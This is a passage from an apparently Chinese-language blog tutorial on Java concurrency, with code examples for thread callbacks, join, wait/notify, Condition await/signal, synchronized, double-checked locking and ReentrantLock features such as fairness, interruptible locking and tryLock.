<li>在回答者的类内部创建回调接口的对象</li>
<li>在提问者里面实例化接口对象，重写接口方法</li>
</ol>
<p>这个点很重要，回调对象的实例化，要在提问者的类内实例化，然后重写接口的方法，相当于提问者先把一个联络方式给回答者，回答者找到答案后，通过固定的联络方式，来告诉提问者答案</p>
<ol start="4">
<li>调用开始新线程的start方法</li>
<li>原来提问者还可以做自己的事</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Caller</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Answer answer = <span class="keyword">new</span> Answer();</span><br><span class="line">        <span class="comment">//问1+1，线程同步</span></span><br><span class="line">        <span class="keyword">int</span> sum = answer.answerAdd(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//相当于先定好一个返回答案的方式，再来执行实际操作</span></span><br><span class="line">        <span class="comment">//实例化回调接口的对象</span></span><br><span class="line">        answer.callPhone= <span class="keyword">new</span> Answer.CallPhone() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">call</span><span class="params">(String question)</span> </span>&#123;</span><br><span class="line">                <span class="comment">//回答问题者，回答后，才能输出答案</span></span><br><span class="line">                System.out.println(question);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        System.out.println(<span class="string">&quot;交代完毕！&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//相关交代完毕后再执行查询操作</span></span><br><span class="line">        answer.start();</span><br><span class="line">        System.out.println(<span class="string">&quot;提问者做自己的事&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Answer</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">answerAdd</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">interface</span> <span class="title">CallPhone</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">call</span><span class="params">(String question)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CallPhone callPhone;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 回答问题</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">answerQuestion</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;开始查找资料&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (callPhone!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            callPhone.call(<span class="string">&quot;回答者知道答案了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        answerQuestion();</span><br><span class="line">        <span class="keyword">super</span>.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="线程间调用"><a href="#线程间调用" class="headerlink" title="线程间调用"></a>线程间调用</h1><p>当多个线程可以一起工作去解决某个问题时，如果某些部分必须在其它部分之前完成，那么就需要对线程进行协调。</p>
<h2 id="join"><a href="#join" class="headerlink" title="join"></a>join</h2><blockquote>
<p>Thread中的实例方法</p>
<p>在<strong>当前线程中调用另一个线程</strong>的<code>join()</code>方法，会将当前线程挂起，等待另一个线程执行完毕之后再继续往下执行</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    test();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException</span>&#123;</span><br><span class="line">    Thread thread = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        i = <span class="number">10</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">    thread.start();</span><br><span class="line">    thread.join(); <span class="comment">//10，无join0</span></span><br><span class="line">    System.out.println(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="wait-notify-notifyAll"><a href="#wait-notify-notifyAll" class="headerlink" title="wait/notify/notifyAll"></a>wait/notify/notifyAll</h2><p><code>wait()</code>是在Object类下的方法，必须在获得对象锁状态下才能使用<code>wait/notify/notifyAll</code></p>
<p><code>wait()</code>方法会将当前线程挂起，等待某个条件满足。当其他线程运行使得这个条件满足了，其他线程会调用<code>notify()</code>或者<code>notifyAll()</code>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//线程放弃同步锁进入阻塞状态，直到被其他线程进入该同步锁唤醒为止</span></span><br><span class="line"><span class="comment">//带参wait,会在时限结束后直接进入BLOCKING状态</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">wait</span><span class="params">(<span class="keyword">long</span> timeout)</span> <span class="keyword">throws</span> InterruptedException</span>;</span><br><span class="line"><span class="comment">//随机唤醒一个此同步锁上等待的线程</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">notify</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//唤醒此同步锁上所有等待中的线程。</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">notifyAll</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="sleep和wait区别"><a href="#sleep和wait区别" class="headerlink" title="sleep和wait区别"></a>sleep和wait区别</h3><ol>
<li><p><code>wait()</code>是Object类的实例方法，<code>sleep()</code>是Thread的静态方法，俩者都可用于暂停线程的执行</p>
</li>
<li><p><code>wait()</code>方法必须在同步方法或同步代码块中调用，即已经获得对象锁，否则会抛出<code>IllegalMonitorStateException</code> ，<code>sleep()</code>没有这个限制</p>
</li>
</ol>
<ul>
<li><p><code>wait()</code>会释放当前占有的对象锁，使该线程进入等待池<code>waitSet</code>中，等待下一次获得资源。如果没有释放锁，那么其他线程就无法进入对象的同步方法或同步代码块中，那么就无法执行<code>notify()</code>或<code>notifyAll()</code>来唤醒挂起的线程，造成死锁。 </p>
</li>
<li><p><code>sleep()</code>只是会让出CPU并不会释放掉对象锁</p>
</li>
</ul>
<ol start="3">
<li><p><code>sleep()</code>在休眠时间达到时后如果再次获得CPU时间片就会继续执行，而<code>wait()</code>方法必须等待</p>
<ul>
<li><code>Object.notify</code>/<code>Object.notifyAll</code>通知后，才会离开等待池，进入阻塞队列，并且再次获得CPU时间片才会继续执行</li>
</ul>
</li>
<li><p><code>wait()</code>通常用于线程间交互/通信，sleep通常用于暂停执行</p>
</li>
</ol>
<h3 id="wait原理"><a href="#wait原理" class="headerlink" title="wait原理"></a>wait原理</h3><img src="https://csn.damyoung.cn/image-20201002175837645.png" alt="image-20201002175837645" style="zoom: 80%;" />

<ol>
<li><p>Owner线程发现条件不满足，调用<code>wait()</code>，即可进入<code>waitSet</code>进入<code>WAITING</code>状态</p>
</li>
<li><p><code>BLOCKED</code>(未获得过锁的线程)与<code>WAITING</code>(调用<code>wait</code>方法)线程<strong>都处于阻塞状态</strong>，<strong>不占用CPU时间片</strong></p>
</li>
</ol>
<ul>
<li><p><code>BLOCKED</code>线程在<code>Owner</code>线程释放锁时唤醒</p>
</li>
<li><p><code>Waiting</code>线程在<code>Owner</code>线程调用<code>notify</code>/<code>notifyAll</code>时唤醒，但仍进入<code>EntryList</code>条件变量中重新竞争 </p>
</li>
</ul>
<h2 id="await-signal-signalAll"><a href="#await-signal-signalAll" class="headerlink" title="await/signal/signalAll"></a>await/signal/signalAll</h2><p>J.U.C类库中提供了<code>condition</code>类来提供实现<strong>线程间的协调</strong>，可以在<code>condition</code>上调用<code>await()</code>方法使线程等待，其他线程调用<code>signal()</code>或<code>signalAll()</code>方法来唤醒等待的线程</p>
<p>相比<code>wait()</code>这种等待方式，<code>await()</code>可以指定等待的条件，因此更加灵活</p>
<p>使用<code>lock</code>来获得一个<code>Condition</code>对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Condition <span class="title">newCondition</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> sync.newCondition();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//sync同步器</span></span><br><span class="line"><span class="function"><span class="keyword">final</span> ConditionObject <span class="title">newCondition</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ConditionObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Lock lock = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line"><span class="keyword">private</span> Condition condition = lock.newCondition();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;before&quot;</span>);</span><br><span class="line">        <span class="comment">//唤醒线程</span></span><br><span class="line">        condition.signalAll();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//线程等待</span></span><br><span class="line">        condition.await();</span><br><span class="line">        System.out.println(<span class="string">&quot;after&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h1><p>Java提供了俩种锁机制来控制多个线程对共享资源的互斥访问，第一个是JVM实现的<code>Synchronized</code>，第二个是JDK实现的<code>ReentrantLock</code></p>
<h2 id="Synchronized"><a href="#Synchronized" class="headerlink" title="Synchronized"></a>Synchronized</h2><blockquote>
<ol>
<li>对象锁==采用互斥的方式让同一个时刻只能有一个线程持有对象锁，其他线程再获取时会被阻塞</li>
</ol>
<p>​                而持有锁线程可以安全执行临界区代码，保证临界区代码的原子性，不用担心上下文切换问题</p>
<ol start="2">
<li><code>Synchronized</code>是获取对象上的锁，修饰实例方法锁的是this实例对象，修饰类方法锁的是类对象</li>
<li>保证临界区代码有序性，但不能阻止指令重排序</li>
<li>加锁需要加上同一把对象锁，不让无互斥现象</li>
</ol>
</blockquote>
<p>每个对象上有一把锁，线程可以使用<code>Synchronized</code>关键字来获取对象上的锁。<code>Synchronized</code>关键字主要用于解决多个线程间访问共享资源的同步性，<code>Synchronized</code>关键字可以保证被它修饰的方法或代码块在同一时刻只能有一个线程执行。</p>
<p>早期的<code>Synchronized</code>属于重量级锁，效率低下，因为监视器锁<code>Monitor</code>是依赖于底层操作系统的<code>Mutex Lock</code>来实现的，Java线程都是映射到操作系统的内核线程上。如果挂起或唤醒一个线程都需要操作系统来帮助完成，而操作系统实现线程之间的切换需要从用户态转换到内核态，这个状态之间的转换需要相对较长的时间，时间成本相对较高，这也是早期<code>Synchronized</code>效率低的原因。</p>
<p>jdk1.6之后开始从JVM层面对<code>Synchronized</code>较大优化，引入了偏向锁，轻量级锁，自旋锁、自适应自旋锁、锁消除、锁粗化等技术来减少锁操作的开销，执行效率和<code>ReentrantLock</code>差不多。</p>
<h3 id="使用Synchronized关键字"><a href="#使用Synchronized关键字" class="headerlink" title="使用Synchronized关键字"></a>使用Synchronized关键字</h3><ul>
<li>初始标志位为1，线程访问时标志位设置为0，该线程获得访问代码块的权限</li>
<li>其他线程访问时发现为0则线程进入阻塞；执行完毕时设置为1</li>
</ul>
<h4 id="同步代码块"><a href="#同步代码块" class="headerlink" title="同步代码块"></a>同步代码块</h4><blockquote>
<p>this/.class/其他对象，不能使用匿名内部类</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>)&#123;</span><br><span class="line">		<span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//锁的是类对象</span></span><br><span class="line">    <span class="keyword">synchronized</span>(SynchronizedExample.class) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="同步方法"><a href="#同步方法" class="headerlink" title="同步方法"></a>同步方法</h4><blockquote>
<p>分为俩种</p>
<ul>
<li>实例方法，锁的是实例对象</li>
<li>静态方法，锁的是类对象(该类所有对象)</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>上面俩个方法只能作用于同一个对象，如果调用俩个对象上的同步代码块，就不会进行同步。</p>
</blockquote>
<h4 id="同步一个静态方法"><a href="#同步一个静态方法" class="headerlink" title="同步一个静态方法"></a>同步一个静态方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>作用于整个类，也就是说两个线程调用同一个类的不同对象上的这种同步语句时，也会进行同步。</p>
</blockquote>
<h3 id="三个特性"><a href="#三个特性" class="headerlink" title="三个特性"></a>三个特性</h3><p><strong>原子性-</strong><code>synchronized</code>关键字保证同一时刻只能有一个线程执行临界区的代码，其他线程访问会被阻塞</p>
<p>**可见性-**在线程执行完毕会把对变量的修改刷新到主存中</p>
<p>**有序性-**保证临界区代码不会发生上下文切换，当变量完全被<code>Synchronized</code>保护，即使临界区代码发生重排序也无影响，故能保证作用范围内代码有序性(但不能禁止重排序)</p>
<h3 id="双重检锁实现单例"><a href="#双重检锁实现单例" class="headerlink" title="双重检锁实现单例"></a>双重检锁实现单例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">static</span> Singleton instance;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//判断对象是否已经实例化，没有实例化过才进入加锁代码</span></span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;<span class="comment">//步骤1</span></span><br><span class="line">            <span class="comment">//类对象加锁</span></span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;<span class="comment">//步骤2</span></span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;<span class="comment">//步骤3</span></span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton();<span class="comment">//步骤4</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>特点</strong></p>
<blockquote>
<ul>
<li>懒惰实例化</li>
<li>首次使用<code>getInstance()</code>，才会使用<code>Synchronized</code>加锁，后续使用无需加锁</li>
<li>第一个if是在同步代码块外，存在线程安全问题，<strong>加入<code>volatile</code>禁止指令重排序</strong></li>
</ul>
</blockquote>
<p><strong>问题</strong></p>
<blockquote>
<p>由于Synchronized保证作用范围内临界区的有序性，并不能禁止指令重排</p>
</blockquote>
<p>因为<code>instance = new Singleton()</code>这条语句实际上包含了<strong>三个操作：</strong></p>
<p>1.分配对象的内存空间；</p>
<p>2.初始化对象<code>new Singleton()</code>；</p>
<p>3.设置instance指向刚分配的内存地址。 </p>
<blockquote>
<p>步骤2和步骤3可能会被重排序，流程变为1-&gt;3-&gt;2</p>
</blockquote>
<p>如果2和3进行了重排序的话，线程B进行判断<code>if(instance==null)</code>时也会为false，而实际上这个instance并没有初始化成功，将会读取到一个没有初始化完成的对象。</p>
<blockquote>
<p><strong>用volatile修饰</strong>的话就可以禁止2和3操作重排序，从而避免这种情况。<strong>volatile包含禁止指令重排序的语义，其具有有序性</strong>。</p>
</blockquote>
<h3 id="底层原理"><a href="#底层原理" class="headerlink" title="底层原理"></a>底层原理</h3><p><code>Synchronized</code>关键字的原理属于JVM层面</p>
<h4 id="同步语句块"><a href="#同步语句块" class="headerlink" title="同步语句块"></a>同步语句块</h4><p><code>Synchronized</code>同步语句块的实现使用<code>monitorenter</code>和<code>monitorexit</code>指令，<code>monitorenter</code>指令指向同步代码块开始位置，<code>monitorexit</code>指令指向同步代码块的结束位置。</p>
<p>当执行<code>monitorenter</code>指令时，线程试图获得对象锁也就是<code>monitor</code>的持有权(<code>monitor</code>对象存在于每个Java对象的对象头中，<code>Synchronized</code>锁便是通过这种方式获得锁)</p>
<p>当计数器为0则表示可以获取，获取成功将锁计数器设为1，相应<code>monitorexit</code>指令后，将锁计数器设为0，表明锁被释放。如果获取对象锁失败，那么当前线程就要阻塞等待，直到锁被另外一个线程释放为止。</p>
<h4 id="同步方法-1"><a href="#同步方法-1" class="headerlink" title="同步方法"></a>同步方法</h4><p><code>Synchronized</code>修饰方法并没有<code>monitorenter</code>和<code>monitorexit</code>指令，取而代之是<code>ACC_SYHCHRONIZED</code>标识，标识指明了该方法是一个同步方法，JVM通过该指令访问标志来辨别一个方法是否声明为同步方法，从而执行相应的同步调用。</p>
<h3 id="Synchronized是否一定线程安全"><a href="#Synchronized是否一定线程安全" class="headerlink" title="Synchronized是否一定线程安全"></a>Synchronized是否一定线程安全</h3><p>从上面的实现原理可以知道，synchronized针对方法和语句块的加锁对象不一致，所以导致synchronized修饰的地方不同，就有可能引起并发访问一个变量这种线程不安全的情况</p>
<h2 id="ReentrantLock"><a href="#ReentrantLock" class="headerlink" title="ReentrantLock"></a>ReentrantLock</h2><blockquote>
<p>JUC并发包，由jdk实现锁，不同于Synchronized直接操作monitor对象</p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201007164306417.png" alt="image-20201007164306417" style="zoom:67%;" />

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Lock lock = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line"><span class="comment">//获取锁</span></span><br><span class="line">reentrantLock.lock();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="comment">//临界区</span></span><br><span class="line">&#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">    <span class="comment">//释放锁</span></span><br><span class="line">    reentrantLock.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="可重入锁"><a href="#可重入锁" class="headerlink" title="可重入锁"></a>可重入锁</h3><blockquote>
<p>可重入锁指的是一个线程如果首次获得这把锁，那么它就是这把锁的拥有者，因此有权力再次获得该锁</p>
<p><code>Synchronized</code>和<code>ReentrantLock</code>都是可重入锁</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Lock lock=<span class="keyword">new</span> ReentrantLock();</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        m1();</span><br><span class="line">        System.out.println(<span class="string">&quot;main&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">        System.out.println(<span class="string">&quot;finally&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">m1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;m1&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">        System.out.println(<span class="string">&quot;m1Finally&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="非公平锁和公平锁"><a href="#非公平锁和公平锁" class="headerlink" title="非公平锁和公平锁"></a>非公平锁和公平锁</h3><blockquote>
<p>公平锁：是指多个线程是按申请锁的顺序来获得锁</p>
<p>非公平锁：是指多个线程获得锁的顺序并不是按照申请锁的顺序，有可能后申请锁的线程优先获得锁</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//默认是非公平锁</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ReentrantLock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    sync = <span class="keyword">new</span> NonfairSync();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ReentrantLock</span><span class="params">(<span class="keyword">boolean</span> fair)</span> </span>&#123;</span><br><span class="line">    sync = fair ? <span class="keyword">new</span> FairSync() : <span class="keyword">new</span> NonfairSync();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="条件变量condition"><a href="#条件变量condition" class="headerlink" title="条件变量condition"></a>条件变量condition</h3><ul>
<li><code>Condition</code>类是<code>JUC</code>类库中用来实现线程之间的协调关系</li>
<li>每个<code>condition</code>条件变量对应一个等待队列，其实现类是<code>ConditionObject</code>(AQS内部类，继承与Condition)</li>
<li><code>ReentrantLock</code>支持多个条件变量，<code>Synchronized</code>的<code>waitSet</code>(只支持一个)<ul>
<li>await前需要获得锁，执行后会释放锁，进入<code>ConditionObject</code>等待</li>
<li>await线程被唤醒(或打断、或超时)，重新竞争lock锁</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//条件变量2个</span></span><br><span class="line">Condition condition1 = lock.newCondition();</span><br><span class="line">Condition condition2 = lock.newCondition();</span><br><span class="line"></span><br><span class="line">lock.lock();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//进入condition1等待</span></span><br><span class="line">    condition1.await();</span><br><span class="line">    <span class="comment">//唤醒condition1中的线程</span></span><br><span class="line">    condition1.signal();</span><br><span class="line">    condition1.signalAll();</span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">    lock.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>可以在<code>Condition</code>上调用<code>await()</code>方法使线程等待，其它线程调用<code>signal()</code>或<code>signalAll()</code>方法唤醒等待的线程。</p>
<p>相比于<code>wait()</code>这种等待方式，<code>await()</code>可以指定等待的条件，因此更加灵活</p>
</blockquote>
<h3 id="可打断"><a href="#可打断" class="headerlink" title="可打断"></a>可打断</h3><blockquote>
<p>默认为不可打断模式</p>
<p>可打断模式调用<code>lock.lockInterruptibly</code>方法实现，指线程可以被其他线程调用<code>interrupt()</code>打断。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lockInterruptibly</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    sync.acquireInterruptibly(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">tryRelease</span><span class="params">(<span class="keyword">int</span> releases)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c = getState() - releases;</span><br><span class="line">    <span class="keyword">if</span> (Thread.currentThread() != getExclusiveOwnerThread())</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalMonitorStateException();</span><br><span class="line">    <span class="keyword">boolean</span> free = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="number">0</span>) &#123;</span><br><span class="line">        free = <span class="keyword">true</span>;</span><br><span class="line">        setExclusiveOwnerThread(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setState(c);</span><br><span class="line">    <span class="keyword">return</span> free;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread thread = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;thread&quot;</span>);</span><br><span class="line">        <span class="comment">//设置lock为可打断</span></span><br><span class="line">        <span class="comment">//如果没有竞争那么此方法会获取Lock对象锁</span></span><br><span class="line">        <span class="comment">//如果有竞争进入阻塞队列，可以被其他线程用interrupt打断</span></span><br><span class="line">        lock.lockInterruptibly();</span><br><span class="line">    &#125;<span class="keyword">catch</span> (InterruptedException e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        System.out.println(<span class="string">&quot;中断异常&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;获得到锁&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">lock.lock();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//开启thread线程</span></span><br><span class="line">    thread.start();</span><br><span class="line"></span><br><span class="line">    Thread.sleep(<span class="number">1</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;打断thread&quot;</span>);</span><br><span class="line">    <span class="comment">//打断thread线程</span></span><br><span class="line">    thread.interrupt();</span><br><span class="line">&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">    lock.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="锁超时"><a href="#锁超时" class="headerlink" title="锁超时"></a>锁超时</h3><blockquote>
<p>设置时间，使得在阻塞队列中立即失败，<code>tryLock</code>就是试一下，如果能得到锁，就返回true；得不到则false，立即失败绝不等</p>
</blockquote>
